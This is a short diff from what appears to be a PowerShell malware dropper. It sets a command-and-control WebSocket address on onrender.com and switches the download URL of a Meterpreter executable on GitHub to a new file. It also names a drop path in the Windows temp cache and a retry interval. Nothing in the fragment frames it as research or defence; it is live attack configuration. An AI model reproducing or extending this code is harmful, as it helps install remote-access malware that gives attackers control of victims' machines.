@@ -12,7 +12,7 @@ try {
 } catch {}
 
 $C2_URL          = "wss://c2-render.onrender.com"
-$METERPRETER_URL = "https://github.com/R0b0tik0/shell/raw/refs/heads/main/meterpreter.exe"
+$METERPRETER_URL = "https://github.com/R0b0tik0/shell/raw/refs/heads/main/meterpreter-oma.exe"
 $PAYLOAD_PATH    = "$env:windir\temp\Cache\meterpreter.exe"
 $RETRY_SECONDS   = 15
 
